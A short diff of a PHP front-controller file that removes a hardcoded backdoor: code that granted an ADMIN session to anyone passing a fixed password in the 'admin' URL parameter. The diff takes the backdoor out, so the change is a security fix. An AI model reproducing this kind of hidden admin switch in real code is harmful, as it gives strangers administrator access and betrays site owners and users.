@@ -135,12 +135,6 @@ define('HEADER',$sBase . '/app/_views/HEADER.php');
 */
 define('FOOTER',$sBase . '/app/_views/FOOTER.php');
 
-
-$sAdmin = @ $_GET['admin'];
-if ($sAdmin == 'killerbread1') {
-	$mvc->request->setSessionVar('ADMIN','1');
-}
-
 // handle our front controller task
 $bStopWhenRouted = TRUE;
 $mvc->request->dispatchRoute('',$bStopWhenRouted);
